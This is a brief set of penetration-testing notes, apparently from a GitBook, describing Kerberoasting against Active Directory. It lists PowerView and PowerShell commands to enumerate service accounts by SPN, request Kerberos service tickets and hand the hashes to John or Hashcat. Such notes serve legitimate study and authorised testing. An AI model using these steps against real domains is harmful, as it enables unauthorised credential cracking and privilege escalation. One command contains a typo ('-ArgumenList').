# AD - Privilege Escalation

## 🍳Kerberoast

### Description

* Offline cracking of service account password
* The Kerberos session ticket (TGS) has a server portion which is encrypted with the password hash/NTLM hash of the service account - this makes it possible to request a ticket and do offline cracking
* Service accounts are many times ignored (less pw changes) and have privileged access
* Password hashes of services accounts could be used to create silver tickets
* In the logs will only be a Kerberos Ticket Requested entry on the dc
* If an account has the property ServicePrincipalName set to not 'null', the KDC assumes that it is a service account
* Abuse Step 3 and 4 - when we get it afte step 4 we can brute force it

{% hint style="info" %}
Only target user service accounts and not machine accounts.

Machine accounts wont work, because they create 100 characters and rotate it every 30 days.
{% endhint %}



### Requirement

* No privs needed



### Tool

**Find user accounts used as service accounts:**\
PowerView: Get-NetUser -SPN\
\
ADModule:\
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -properties ServicePrincipalName

**Request a TGS for the SPN**\
Add-Type -AssemblyName System.IdentityModel\
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumenList "SPN Name from command before"

Request-SPNTicket from PowerView can be used for crakcing with John or Hashcat
